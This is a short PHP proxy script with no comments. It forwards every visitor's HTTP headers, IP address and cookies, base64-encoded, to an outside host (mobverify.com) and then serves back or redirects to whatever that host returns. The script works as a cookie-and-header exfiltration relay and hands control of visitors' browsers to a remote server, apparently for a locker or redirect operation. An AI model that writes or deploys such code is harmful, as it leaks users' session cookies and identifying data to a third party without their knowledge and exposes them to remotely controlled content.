<?php
header("Access-Control-Allow-Origin: *");

$query_string = http_build_query($_GET);

if(empty($query_string)) {
	die("Empty query string");
}

$url = "https://mobverify.com/mirror-v2.php?$query_string";
$http_headers = array();

foreach($_SERVER as $key => $value) {
	if(substr($key, 0, 5) === "HTTP_" || $key === "REMOTE_ADDR") {
		$http_headers[$key] = $value;
	}
}

$http_headers = json_encode($http_headers);
$http_headers = base64_encode($http_headers);
$cookies = json_encode($_COOKIE);
$cookies = base64_encode($cookies);
$postfields = array(
	"tool" => filter_input(INPUT_GET, "tool") ,
	"toolarg" => filter_input(INPUT_GET, "toolarg") ,
	"headers" => $http_headers,
	"cookies" => $cookies,
);
$postfields = json_encode($postfields);

$content_type = null;

function header_function($curl, $header) {
	global $content_type;
	$len = strlen($header);
	$header = explode(':', $header, 2);
	if (count($header) < 2) {
		return $len;
	}

	if(strtolower(trim($header[0])) === 'content-type') {
		$content_type = trim($header[1]);
	};

	return $len;
}

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $postfields,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
	CURLOPT_HEADERFUNCTION => "header_function",
]);
$content = curl_exec($ch);
$url_new = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);
$host = parse_url($url_new, PHP_URL_HOST);

if($host === "mobverify.com") {
	if(!is_null($content_type)) {
		header("Content-Type: $content_type");
	}
	echo $content;
} else {
	header("Location: $url_new");
}